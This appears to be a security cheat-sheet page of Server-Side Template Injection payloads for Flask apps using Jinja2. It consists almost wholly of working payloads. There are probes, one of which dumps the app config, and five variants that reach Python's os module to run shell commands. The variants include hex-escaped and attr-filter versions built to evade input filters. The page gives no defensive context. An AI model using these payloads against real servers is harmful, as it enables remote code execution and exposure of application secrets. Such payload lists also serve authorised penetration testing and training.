---
title: Flask Jinja2 Template Injection
desc: Examples for Server-Side Template Injection for Flask with Jinja2.
tags: [Web]
alts: []
website:
---

{% raw %}

```
{{ 4*2 }}
{{ config.items() }}
```

<br />

## OS commands

```
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}

{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}

{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}

{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}
```

{% endraw %}